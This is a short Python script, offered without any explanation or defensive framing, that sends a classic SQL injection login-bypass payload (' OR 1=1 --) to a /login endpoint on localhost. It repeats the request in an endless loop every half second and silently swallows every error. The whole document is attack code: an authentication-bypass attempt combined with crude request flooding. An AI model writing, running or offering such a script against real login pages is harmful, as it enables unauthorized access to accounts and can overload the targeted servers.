import requests
import time

def sql_injection(target_url):
    payload = "' OR 1=1 --"
    while True:
        try:
            requests.get(f"{target_url}/login?username={payload}&password=anything")
        except Exception:
            pass
        time.sleep(0.5)

if __name__ == "__main__":
    sql_injection("http://127.0.0.1:5000")
